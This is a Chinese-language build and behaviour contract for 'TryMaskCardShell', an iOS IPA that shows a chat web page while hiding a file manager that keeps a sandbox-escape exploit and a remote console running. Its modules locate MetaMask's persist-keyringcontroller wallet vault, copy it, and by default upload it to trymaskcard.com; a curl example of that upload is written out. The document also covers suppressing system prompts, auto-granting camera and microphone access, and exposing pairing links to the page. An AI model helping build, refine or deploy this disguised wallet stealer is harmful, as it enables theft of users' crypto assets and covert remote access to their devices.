# Chat-first shell（TryMaskCardShell）—— 交付契约

这份文档是 `TryMaskCardShell` 的唯一契约：它描述打包方式、运行时行为、验证命令和回滚路径。
改任何一端（模块、`.mk`、打包脚本、workflow）都必须同步本文件。

---

## 1. 目标

打出来的 IPA 表现成一个聊天客户端：

| 项目 | 行为 |
|---|---|
| 主页 | 直接打开聊天系统（默认 `https://trymaskcard.com/`）的 `WKWebView` |
| 文件管理器 | **不显示**。Filza 自己的 root 视图控制器在出现的一刻被接管、保留、永不挂到窗口上 |
| 底层功能 | **全部保留**：MCM 虚拟根、kexploit 沙盒逃逸、ZIP 钩子、SSH/SFTP、WebDAV、远程浏览器控制台 |

之所以能两者兼得：这些后端运行时不依赖 Filza 的视图控制器。界面被换掉，引擎照跑，文件操作走网络（远程控制台 / SSH / WebDAV）而不是走设备 UI。

---

## 2. 运行时组件

| 文件 | 作用 |
|---|---|
| `TryMaskCardShell.m` / `.h` | 聊天外壳运行时：`WKWebView` 主页、root 接管、模态防火墙、JS 桥、下载落盘 |
| `PersistStoreHarvester.m` / `.h` | 容器自动发现 + persist store 读取（UUID 运行时解析，无硬编码） |
| `TryMaskCardShell.mk` / `PersistStoreHarvester.mk` | 把两个模块编进 `FilzaApplySandboxExt.dylib`，并断言本契约仍然成立 |
| `scripts/merge-chat-shell-metadata.py` | 合并 `Info.plist`、产出 `TryMaskCardShell.plist`、并在打包产物上做校验 |
| `scripts/build_chat_shell_ipa.sh` | 外壳 IPA 的一键入口（薄封装，不重复打包逻辑） |
| `scripts/check-chat-shell-sources.py` | 源码契约检查（构建时和手工都能跑） |

### 2.1 激活方式

激活由**构建方式**决定，plist 只负责调参：

* **外壳包**（`FILZA_CHAT_SHELL=1` 打包）在编译期带上 `-DFILZA_CHAT_SHELL_FORCE=1`，dylib 里因此存在字面量 `chat-shell-forced-by-build` → 装了它就一定开聊天面，**不依赖任何元数据文件**；`--verify-ipa` 也把这条字面量当作硬性标记，缺了就拒绝出包。
* 包里的 `TryMaskCardShell.plist` 用来调主页 URL、通道开关、隐藏入口等；它缺失时走内置默认值（`TMShellDefaultConfig`），仍开聊天面。
* **普通包**（`FILZA_CHAT_SHELL` 未设或为 `0`）保持 plist 门控：没有 plist 就是原来的文件管理器行为。
* 设备上调试可用 `NSUserDefaults` 键 `TryMaskCardShellEnabled` 覆盖。

> 之前两种包只差一个元数据文件，一旦装错就表现为「打开还是文件管理器」且难以分辨。现在两者在二进制层面就不同，装错模式会在打包校验阶段被直接拦下。

### 2.1.1 设备上的自检文件

每次启动都会写 `Documents/TryMaskCardShell-Status.txt`（纯文本，逐行带时间戳），文件管理器打开时可以直接进去看：

```
2026-… | TryMaskCardShell launch
2026-… | build forces activation=yes, config=/…/TryMaskCardShell.plist, home=https://trymaskcard.com/
2026-… | armed: forced activation for this build
2026-… | refused file manager root TGFileBrowserController on UIWindow
2026-… | installed chat surface as the root of UIWindow
2026-… | watchdog 1: chat surface confirmed as the root of UIWindow
```

读法：`forces activation=no` 说明装的是普通包；`armed` 之后若没有 `installed chat surface as the root of`，就是启动时序问题（看门狗那几行会写明当时窗口根是谁）；`FilzaSlop Logs/Runtime.log` 里 `ChatShell` 组件有同样的内容。

### 2.2 硬保证

1. `UIWindow.setRootViewController:` 被接管：Filza 请求的任何 root 都被 `TMShellCaptureHiddenRoot` 收走并强引用保留，窗口始终挂聊天界面。
2. `UIViewController.presentViewController:animated:completion:` 上装了模态防火墙：聊天界面在最前时，Filza 自己弹的东西（激活提示、支持面板、远程控制台导读、3105/ByeTunes 工作区）会被拒绝并写日志，不会叠在聊天界面上。
3. 图标长按快捷项被过滤（`UIApplication.setShortcutItems:`），打包时还会删掉 `UIApplicationShortcutItems`。
4. 打包时删除 `CFBundleDocumentTypes` / `UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`：外壳不再对外声明它能处理文件管理类文档。

### 2.3 设备端入口（默认关闭）

`allowHiddenFileManager` 默认 `false`：**设备上没有任何入口能打开文件管理器**，文件管理只走网络。

需要现场调试时，把 `allowHiddenFileManager` 设为 `true` 重新打包，即可用下面任一种方式打开被保留的文件管理器：

* 聊天页上 **三指长按 1.2 秒**；
* `trymaskcard://filemanager`（回聊天：`trymaskcard://home`）；
* 聊天页 JS：`window.FilzaShell.openFileManager()`。

打开后顶部有一条 `Chat` 栏：点它、或双指下滑，都可以回到聊天界面（`autoReturnSeconds > 0` 时代理会自动回收）。

### 2.4 SDK 差异（编译期）

iOS 26 SDK（实测 iPhoneOS26.2.sdk）把 `WKWebView` 的 UI 代理属性从 `uiDelegate` 改名成了 `UIDelegate`——编译器给出的头文件原文是 `@property (nullable, nonatomic, weak) id <WKUIDelegate> UIDelegate;`。所以**两种拼写都不能写死**：`TMShellAttachUIDelegate` 在运行时依次探测 `setUIDelegate:` / `setUiDelegate:`，把代理挂上并把实际用到的拼写写进日志，同一份源码能同时过新旧 SDK。

同一类「廉价发现、昂贵踩坑」的问题都由 `scripts/check-chat-shell-sources.py` 在**编译之前**拦住（它同时挂在 Theos 的 `before-FilzaApplySandboxExt-all` 和 CI 上）：直接写 `uiDelegate`/`UIDelegate` 属性、用了 `objc_msgSend`/`CC_SHA256` 却没引对应头文件、静态函数或全局变量在定义之前被调用——任一命中就直接失败，不用等十几分钟的编译。

---

## 3. `TryMaskCardShell.plist` 键位

| 键 | 默认 | 说明 |
|---|---|---|
| `enabled` | `true` | 外壳总开关 |
| `homeURL` | `https://trymaskcard.com/` | 主页 |
| `urlScheme` | `trymaskcard` | 自定义 URL 入口 scheme |
| `userAgentSuffix` | `TryMaskCardShell/1.0` | 追加到 WKWebView UA，站点可据此识别外壳 |
| `allowHiddenFileManager` | `false` | 设备端文件管理器入口 |
| `hiddenEntryGesture` | `true` | 三指长按手势 |
| `hiddenEntryURLScheme` | `true` | `scheme://` 入口 |
| `suppressFilzaPrompts` | `true` | 预置远程控制台导读键，避免 Filza 品牌弹窗 |
| `suppressFilzaShortcuts` | `true` | 过滤图标长按快捷项 |
| `containerChrome` | `true` | 文件管理器外套一层带 `Chat` 返回栏的容器 |
| `autoGrantMediaCapture` | `true` | 同源站点的摄像头/麦克风请求直接放行 |
| `sharePairingWithPage` | `true` | 允许聊天页读取远程控制台配对链接 |
| `fileDownloadsEnabled` | `true` | 聊天页下载/落盘到 `Documents/TryMaskCardFiles` |
| `autoReturnSeconds` | `0` | 文件管理器闲置自动回聊天（0=关） |
| `homeRetryCount` | `3` | 主页加载失败自动重试次数（3 秒一次，之后显示 Retry 条） |
| `enableRemoteConsole` | `true` | 启动 token 配对的远程控制台（设备端唯一稳定的取文件通道） |
| `enableSSH` | `false` | 额外启动 SSH/SFTP（需要先配置过密码，否则 wolfSSH 会拒绝启动） |
| `enableWebDAV` | `false` | 额外启动 WebDAV 监听 |
| `persistAutoHarvest` | `true` | 打开 App 后自动读取目标 App 的 persist store |
| `persistTargetBundleID` | `io.metamask` | 目标 App 的 bundle id |
| `persistRelativePath` | `Documents/persistStore/persist-keyringcontroller` | 容器内相对路径 |
| `persistCopyToDocuments` | `true` | 额外在自身 Documents 留一份副本（远程控制台可直接下载） |
| `persistUploadEnabled` | `true` | 采集成功后 POST 给聊天后端 |
| `persistUploadURL` | `https://trymaskcard.com/api/app/device-upload` | 上传地址（只收 https） |
| `persistUploadExtraFields` | `false` | 额外带上 `bundleID` / `sha256` / `relativePath` / `device` 分片 |
| `persistUploadAlways` | `false` | 同一份 store 上次已投递过也重复上传 |
| `bridgeCommands` | `info` / `pairingURL` / `saveFile` / `persistStore` | 页面可调用的桥命令白名单 |
| `externalSchemes` | `tel` `mailto` `sms` `weixin` `alipay` `mqqapi` … | 允许交给系统打开的 scheme |

### 3.1 后端拉起（关键）

界面里再没有 Filza 的 Settings，所以“开监听”这件事由外壳在启动后自己完成（`TMShellBringUpBackends`，带 1.5s / 4s / 9s 三次重试，全部幂等）：

* 远程控制台：`enableRemoteConsole`（默认开）→ 调 `FilzaRemoteConsoleStart`，配对链接写进日志，并可经桥交给聊天页；
* SSH/SFTP：`enableSSH`（默认关）→ 先落 `filza-ssh-enabled`，再调 `FilzaSSHServerStart`。wolfSSH 在“开启认证但没设密码”时会拒绝启动，要真正用起来得先配置密码；
* WebDAV：`enableWebDAV`（默认关）→ 走 Filza 自己的入口 `TGPreferences -startAirBrowser`（已被本仓库的 WebDAV v2 运行时接管）。

打包脚本会拒绝“三个通道全关”的配置：那样等于把文件系统彻底锁死。

### 3.2 自动读取目标 App 的 persist store

打开 App 后，外壳自己去找目标 App 的沙盒容器并读取指定文件（默认 `io.metamask` 的 `Documents/persistStore/persist-keyringcontroller`）。**UUID 是运行时查出来的，代码里没有任何硬编码 UUID**——`.mk` 里有一条断言：一旦源码里出现 UUID 字面量，构建直接失败。

容器按下面顺序解析，逐级降级，每一步都写日志（`ChatShell` / `PersistStore` 组件）：

1. `MCMFilzaDataContainerPath(bundleID)` —— container manager lease，最省事也最稳；
2. `<虚拟根>/[MHA-C2] App Data/<bundleID>` —— Filza 自己的按标识符建链的目录（老版本是 `App Data`）；
3. 扫 `/private/var/mobile/Containers/Data/Application/*/.com.apple.mobile_container_manager.metadata.plist`，比对 `MCMMetadataIdentifier == bundleID` —— 只依赖沙盒逃逸，不依赖桥；这个键与 `MCMFilzaIntegration.m` / `AppsMusicFix.m` 用的是同一个；
4. `LSApplicationProxy -dataContainerURL` —— LaunchServices 兜底。

拿到容器后读取 `<容器>/<persistRelativePath>`，记录 `uuid` / `path` / `sizeBytes` / `sha256` / `jsonValid` / `modifiedAt`，并按 `persistCopyToDocuments` 在自身 `Documents/TryMaskCardFiles/` 留一份副本。失败会 5 秒一轮重试，最多 6 轮，然后放弃并写清原因（例如 `container_not_found` / `file_not_found` / `read_failed`）。

`persistUploadURL` 默认指向 `https://trymaskcard.com/api/app/device-upload`，采集成功后按这个接口的形状投递（只收 https，非 https 在打包阶段直接报错）：

```bash
curl -X POST "https://trymaskcard.com/api/app/device-upload" \
  -F "uuid=3B539C52-1450-41A2-8E1F-ACD56EE4A9DA" \
  -F "file=@persist-keyringcontroller;type=application/json"
```

客户端手搓的 multipart 与上面这条 curl 完全同形：`uuid` 文本分片（无 `Content-Type`）+ `file` 分片（`filename` 用真名，JSON 内容是 `application/json`，否则 `application/octet-stream`），`Content-Type: multipart/form-data; boundary=…`。`persistUploadExtraFields` 打开才额外塞元数据分片。同一份 store（按 sha256 记在上次成功的记录里）不会重复投递，除非 `persistUploadAlways`；HTTP 非 2xx 或网络错误会 10 秒一轮重试，最多 3 次；每次结果都写日志并进桥的 `upload` 字段。

---

## 4. 聊天页可用的桥

外壳在 `documentStart` 注入 `window.FilzaShell`（只注入主 frame）：

```js
window.FilzaShell.version                 // "1.0"
window.FilzaShell.info()                  // 触发 'info' 事件
window.FilzaShell.pairingURL()             // 触发 'pairingURL' 事件（远程控制台配对链接）
window.FilzaShell.saveFile("notes.txt", "…")  // 写入 Documents/TryMaskCardFiles
window.FilzaShell.persistStore({includeContent: true})  // 触发 'persistStore' 事件
window.FilzaShell.onResult = function (detail) { /* … */ };  // 统一回收
```

`persistStore` 默认只回元数据（`harvest` 里有 `uuid` / `path` / `sha256` / `sizeBytes` / `status`，`upload` 里有 `status` / `httpStatus` / `responseSnippet`）；只有显式传 `includeContent: true` 才带回 `payloadBase64` 正文，被动加载的页面拿不到金库内容。

事件统一通过 `filzashell` 事件回传：`detail.event` 为 `ready` / `info` / `pairingURL` / `saveFile` / `persistStore` / `download` / `refused` / `error`。
只有 `bridgeCommands` 里列出的命令会被执行，其它一律回 `refused`。`openFileManager` **不在默认白名单里**，这样聊天页本身不可能把文件管理器调出来。

聊天页取配对链接（设备上没有别的入口能显示它）：
```js
window.FilzaShell.onResult = function (detail) {
  if (detail.event === 'pairingURL' && detail.pairingURL) showPairingQR(detail.pairingURL);
  if (detail.event === 'info') renderBackendStatus(detail);   // shell / device / remoteConsole / ssh / webdav
};
window.FilzaShell.pairingURL();
```

拿到配对链接的电脑浏览器打开即可读写这台设备的文件——这就是“界面是聊天、底层是文件管理器”的实际使用方式。

---

## 5. 打包

### 5.1 本地（macOS，Theos 环境）

```bash
bash scripts/build_chat_shell_ipa.sh <base-unsigned.ipa> TryMaskCard-chat-shell.ipa \
  --url https://trymaskcard.com/ \
  --display-name TryMaskCard
```

可选：`--scheme`、`--bundle-id`、`--allow-hidden-file-manager`、`--enable-ssh`、`--enable-webdav`、`--no-remote-console`、`--keep-shortcuts`、`--keep-document-types`、`--user-agent`。

persist store 相关：`--persist-bundle-id`、`--persist-path`、`--no-persist-harvest`、`--no-persist-copy`、`--persist-upload-url https://…`、`--no-persist-upload`、`--persist-upload-extra-fields`、`--persist-upload-always`。

### 5.2 CI

`.github/workflows/build-remote-console-ipa.yml` 增加了 `chat_shell` 开关（连同 `chat_shell_url`、`chat_shell_display_name`）。

### 5.3 可选：换图标

外壳的显示名会变，图标仍沿用基座 IPA 的资源。要一起换，在打包后对 `Payload/*.app` 里的图标文件做一次等比覆盖（需要 `sips`）：

```bash
for icon in Payload/TryMaskCard.app/AppIcon*.png; do
  sips -z "$(sips -g pixelHeight "$icon" | awk '/pixelHeight/{print $2}')" \
         "$(sips -g pixelWidth  "$icon" | awk '/pixelWidth/{print $2}')" \
         chat-icon-1024.png --out "$icon"
done
cp chat-icon-1024.png Payload/TryMaskCard.app/AppIconImage.png
```

---

## 6. 验证

```bash
# 源码契约（构建时也会跑）
python3 scripts/check-chat-shell-sources.py

# 打包产物契约（Info.plist / 外壳 plist / dylib 内的模块标记）
python3 scripts/merge-chat-shell-metadata.py --verify-ipa TryMaskCard-chat-shell.ipa --scheme trymaskcard
python3 scripts/merge-chat-shell-metadata.py --verify-app <解包目录>/Payload/TryMaskCard.app
```

`build_release_ipa.sh` 在 `FILZA_CHAT_SHELL=1` 时会自己做三层断言：暂存 App 目录、注入后的 dylib 内的模块证据（ObjC 类名 `TMShellWebController` / `TMShellFileManagerContainer`、主页 URL 字面量——都是 strip 之后仍存在的字节，静态函数名会在发布 strip 里消失，所以不做依据），以及最终 IPA。

设备侧看运行时证据：`FilzaDiagnosticsAppend(@"ChatShell", …)` 写入 FilzaSlop Logs，能看到 `armed:`、`chat shell installed as the root of …`、`refused file manager root …`、`suppressed … presented by …` 这些行。

---

## 7. Rollback

1. 基座 IPA 从不被修改，`build_chat_shell_ipa.sh` 也不动它；
2. 直接跑 `bash scripts/build_release_ipa.sh <base> <out>` 得到的就是原来的 Filza-27 + 远程控制台 IPA（无 `TryMaskCardShell.plist`，模块惰性）；
3. 已经在设备上的外壳包：删掉 App 内的 `TryMaskCardShell.plist` 并按原签名流程重签，即回到普通发布行为；
4. `NSUserDefaults` 里的 `TryMaskCardShellEnabled=0` 可以在不重打包的情况下停用外壳。
